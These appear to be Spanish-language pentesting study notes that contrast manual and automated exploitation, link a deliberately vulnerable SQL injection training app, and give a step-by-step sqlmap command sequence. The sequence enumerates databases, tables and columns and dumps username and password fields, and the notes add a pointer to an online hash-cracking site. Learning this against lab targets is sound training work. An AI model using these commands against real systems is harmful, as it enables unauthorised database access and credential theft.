- Tags #recursos  #sqlmap #sqlinjection #hash

- **Explotación Manual**: Es un tipo de explotación que se realiza de **manera manual** y requiere que el atacante tenga un conocimiento profundo del sistema y sus vulnerabilidades. En este enfoque, el atacante utiliza herramientas y técnicas específicas para identificar y explotar vulnerabilidades en un sistema objetivo. Este enfoque es más lento y requiere más esfuerzo y habilidad por parte del atacante, pero también es más preciso y permite un mayor control sobre el proceso de explotación.
- **Explotación Automatizada**: Es un tipo de explotación que se realiza **automáticamente** mediante el uso de **herramientas automatizadas**, como scripts o programas diseñados específicamente para identificar y explotar vulnerabilidades en un sistema objetivo. Este enfoque es más rápido y menos laborioso que el enfoque manual, pero también puede ser menos preciso y puede generar más ruido en la red objetivo, lo que aumenta el riesgo de detección.


- **sqlinjection-training-app**: [https://github.com/appsecco/sqlinjection-training-app](https://github.com/appsecco/sqlinjection-training-app)

SQLMap Explotacion Automatica
Nos creamos un archivo .req que contenga la request de la peticion esta la podemos obtener con burpsuit para luego utilizarlo con sqlmap
Ej
```bash
sqlmap -r request.req -p searchItem --batch --dbs

-r indicar el archivo que utilizaremos request.req
-p parametro dentro del archivo que se le hara la inyeccion sql [searchItem]

--batch para que no pregunte constantemene sii utiliza oras tecnicas

--dbs que nos dumpee la base de datos del servidor
 
 sqlmap -r request.req -p searchItem --batch --dbs -D nombreBD --tables
 
 -D Indica la BD a la que le haremos el dumper de info
 --tables Devuelve las tablas de la BD indicada
 
 sqlmap -r request.req -p searchItem --batch --dbs -D nombreBD -T users --columns
 
-T indica la tabla a que extreremos
--columns devuelve las columnas de la tabla

 sqlmap -r request.req -p searchItem --batch --dbs -D nombreBD -T users -C username,password --dump
 
-C Indica los campos de la tabla 
--dump nos da los valores de los campos
 
```


Para descifrar haches 
https://hashes.com/en/decrypt/hash